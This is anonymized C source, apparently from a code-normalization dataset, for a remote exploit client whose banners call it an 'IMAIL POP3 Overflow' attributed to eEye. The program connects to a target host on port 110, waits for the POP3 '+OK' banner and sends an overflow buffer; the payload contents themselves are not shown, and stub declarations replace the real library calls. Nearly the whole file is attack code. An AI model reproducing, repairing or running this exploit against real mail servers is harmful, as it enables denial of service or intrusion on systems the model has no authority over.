
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; int h_addrtype; } ;
typedef int sockin ;
typedef int WSADATA ;


 int VAR_0 ;
 int FUNC_0 (int,int) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_1 () ;
 scalar_t__ FUNC_2 (int ,int *) ;
 unsigned short FUNC_3 (char*) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int,struct sockaddr*,int) ;
 int FUNC_6 (int) ;
 int FUNC_7 (int ,char*) ;
 struct hostent* FUNC_8 (char*) ;
 int FUNC_9 (unsigned short) ;
 int VAR_3 ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (int,int ,int ,int ) ;
 int FUNC_13 (int ,int ,int ) ;
 int VAR_4 ;
 int FUNC_14 (int ) ;
 char* FUNC_15 (char*,char*) ;

int FUNC_16(int VAR_5, char *VAR_6[])
{





   struct hostent *VAR_7;
   struct sockaddr_in VAR_8;
   char VAR_9[300], *VAR_10;
   int VAR_11, VAR_12;
   char *VAR_13;
   unsigned short VAR_14;


   if (VAR_5 <= 1)
   {
      FUNC_10("IMAIL POP3 Overflow\n");
      FUNC_10("By: Mike@eEye.com\n\n");


      FUNC_10("Usage: %s [hostname] [port]\n", VAR_6[0]);
      FUNC_10("If port is not specified we use '110'\n");


      FUNC_6(0);
   }


   VAR_13 = VAR_6[1];
   if (VAR_6[2]) VAR_14 = FUNC_3(VAR_6[2]);
   else VAR_14 = FUNC_3("110");


   FUNC_10("IMAIL POP3 Overflow\n");
   FUNC_10("By: Mike@eEye.com\n\n");
   VAR_7 = FUNC_8(VAR_13);
   if (VAR_7 == ((void*)0))
   {
      FUNC_10("ERROR: Uknown host %s\n", VAR_13);
      FUNC_6(-1);
   }


   VAR_8.sin_family = VAR_7->h_addrtype;
   VAR_8.sin_port = FUNC_9(VAR_14);
   VAR_8.sin_addr = *((struct in_addr *)VAR_7->h_addr);


   if ((VAR_11 = FUNC_13(VAR_0, VAR_2, 0)) == VAR_1)
   {
      FUNC_10("ERROR: Socket Error\n");
      FUNC_6(-1);
   }


   if ((FUNC_5(VAR_11, (struct sockaddr *) &VAR_8,
                sizeof(VAR_8))) == VAR_1)
   {
      FUNC_10("ERROR: Connect Error\n");
      FUNC_4(VAR_11);
      FUNC_1();
      FUNC_6(-1);
   }


   FUNC_10("Connected to [%s] on port [%d], sending overflow....\n",
          VAR_13, VAR_14);



   if ((VAR_12 = FUNC_11(VAR_11, VAR_9, 300, 0)) == VAR_1)
   {
      FUNC_10("ERROR: Recv Error\n");
      FUNC_4(VAR_11);
      FUNC_1();
      FUNC_6(1);
   }


   VAR_9[VAR_12] = '\0';
   VAR_10 = FUNC_15(VAR_9, "+OK");
   if (VAR_10 == ((void*)0))
   {
      FUNC_10("ERROR: NO +OK response from inital connect\n");
      FUNC_4(VAR_11);
      FUNC_1();
      FUNC_6(-1);
   }


   if (FUNC_12(VAR_11, VAR_3, FUNC_14(VAR_3),0) == VAR_1)
   {
      FUNC_10("ERROR: Send Error\n");
      FUNC_4(VAR_11);
      FUNC_1();
      FUNC_6(-1);
   }


   FUNC_10("Sent.\n");


   FUNC_4(VAR_11);
   FUNC_1();
}
